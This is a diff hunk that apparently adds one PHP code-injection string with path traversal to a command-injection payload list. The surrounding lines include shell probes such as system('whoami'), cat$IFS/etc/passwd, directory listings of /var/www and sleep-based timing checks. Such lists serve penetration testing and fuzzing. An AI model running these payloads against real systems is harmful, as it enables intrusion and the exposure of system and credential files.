@@ -326,6 +326,7 @@ system('whoami');
 ; ls -l /var/www/*
 ; ls -laR /var/www
 ; ping 127.0.0.1 ;
+/../../");print_r(glob('*'));("
 cat$IFS/etc/passwd
 printf %.1s "$PWD"
 system('sleep 5');
